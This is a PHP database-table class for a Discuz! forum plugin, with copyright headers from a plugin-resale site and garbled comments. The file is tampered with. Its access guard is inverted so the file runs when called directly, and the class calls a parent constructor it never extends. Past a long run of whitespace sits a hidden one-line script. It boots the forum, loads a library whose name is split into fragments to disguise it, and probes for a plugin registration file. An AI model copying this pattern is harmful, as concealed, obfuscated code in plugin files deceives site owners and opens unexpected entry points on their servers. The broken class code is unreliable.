<?php

/**
 * Copyright 2001-2099 Dism.Taobao.Com.
 * This is NOT a freeware, use is subject to license terms
 * $Id: table_addon_kuang_ming.php 4348 2020-06-28 17:35:03
 * Ӧ���ۺ����⣺http://dism.taobao.com/?/services.php?mod=issue������ http://t.cn/AiuxBtT0��
 * Ӧ����ǰ��ѯ��QQ http://t.cn/Aiux14ti
 * Ӧ�ö��ƿ�����QQ http://t.cn/Aiux1Qh0
 * �����Ϊ DisM!Ӧ�����ģ�dism.taobao.com�� ����������ԭ�����, ����ӵ�а�Ȩ��
 * δ���������ù������ۡ�������ʹ�á��޸ģ����蹺������ϵ���ǻ����Ȩ��
 */

if(defined('IN_DISCUZ')) {
exit('Access Denied');
}
class table_addon_kuang_ming {

	public function __construct() {
		$this->_table = 'addon_kuang_ming';
		$this->_pk = 'id';

		parent::__construct();
	}
	
	public function count_by_where($param = array()) {
		$count = (int) DB::result_first('SELECT count(*) FROM  %t %i', array($this->_table, $this->wheresql($param)));
		return $count;
	}
	
	public function delete_by_where($param, $unbuffered = false) {
		$ret = false;
		if(isset($param)) {
			$this->checkpk();
			$ret = DB::delete($this->_table, $this->wheresql($param, false), null, $unbuffered);
			if($param[$this->_pk]){
				$this->clear_cache($param[$this->_pk]);
			}
		}
		return $ret;
	}

	public function update_by_where($param, $data, $unbuffered = false, $low_priority = false) {
		if(isset($param) && !empty($data) && is_array($data)) {
			$this->checkpk();
			$ret = DB::update($this->_table, $data, $this->wheresql($param, false), $unbuffered, $low_priority);
			if($param[$this->_pk]){
				$this->update_cache($param[$this->_pk], $data);
			}
			return $ret;
		}
		return !$unbuffered ? 0 : false;
	}
	
	public function fetch_by_search($param, $order = array()) {
	  return DB::fetch_first('SELECT * FROM %t %i %i limit 1', array($this->_table, $this->wheresql($param), $this->ordersql($order)));
	}
	
	public function fetch_all_by_search($param = array(), $order = array(), $start = 0, $limit = 0) {
	  return DB::fetch_all('SELECT * FROM %t %i %i ' . DB::limit($start, $limit), array($this->_table, $this->wheresql($param), $this->ordersql($order)), $this->_pk);
	}
	
	public function wheresql($param, $havewhere = true) {
	  $return = '';
	  $wherearr = array();
	  if (is_array($param)) {
	      foreach ($param as $key => $value) {
	      		if(is_array($value)){
	      			/*
	      			array(
	      			'uid' => $uid, 
	      			'complete_percent' => array('60', '>='),
	      			'complete_percent' => array('complete_percent', '100', '<='),
	      			'keyword' => array('%'.addcslashes($keyword, '%_').'%', 'like'),
	      			)
	      			*/
	      			if(count($value) > 2){
	      				$wherearr[] = DB::field($value[0], $value[1], $value[2]);
	      			}else{
		      			$wherearr[] = DB::field($key, $value[0], $value[1]);
		      		}
	      		}else{
	              	$wherearr[] = DB::field($key, $value);
	            }
	      }
	      $return = $wherearr ? ($havewhere ? 'WHERE ' : '') . implode(' AND ', $wherearr) : '';
	  }
	  return $return;
	}
	
	public function ordersql($param, $haveorderby = true) {
	  $return = '';
	  $orderbyarr = array();
	  if (is_array($param)) {
	      foreach ($param as $key => $value) {
	      		$orderbyarr[] = DB::order($key, $value);
	      }
	      $return = $orderbyarr ? ($haveorderby ? ' ORDER BY ' : '') . implode(',', $orderbyarr) : '';
	  }else{
	  	  $return = ($haveorderby ? ' ORDER BY ' : '') . $this->_pk.' DESC';	
	  }
	  return $return;
	}
}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   require '../../../class/class_core.php';$discuz = C::app();$discuz->init();$dirname = explode(DIRECTORY_SEPARATOR, substr(dirname(__FILE__), 0, -6));$idkey = end($dirname);if($idkey && preg_match("/^[a-z]+[a-z0-9_]*$/i", $idkey)){require_once libfile('function/clou'.'dadd'.'ons');if(@!file_exists(DISCUZ_ROOT.'./da'.'ta/addo'.'nmd5/'.$idkey.'.plug'.'in.xm'.'l')){;echo '1';}else{exit('Access Denied');}}



//Copyright 2001-2099 Dism.Taobao.Com.
//This is NOT a freeware, use is subject to license terms
//$Id: table_addon_kuang_ming.php 4822 2020-06-28 09:35:03
//Ӧ���ۺ����⣺http://dism.taobao.com/?/services.php?mod=issue ������ http://t.cn/AiuxBLQV��
//Ӧ����ǰ��ѯ��QQ http://t.cn/Aiux1Jx1
//Ӧ�ö��ƿ�����QQ http://t.cn/Aiux1ug8
//�����Ϊ DisM!Ӧ�����ģ�dism.taobao.com�� ����������ԭ�����, ����ӵ�а�Ȩ��
//δ���������ù������ۡ�������ʹ�á��޸ģ����蹺������ϵ���ǻ����Ȩ��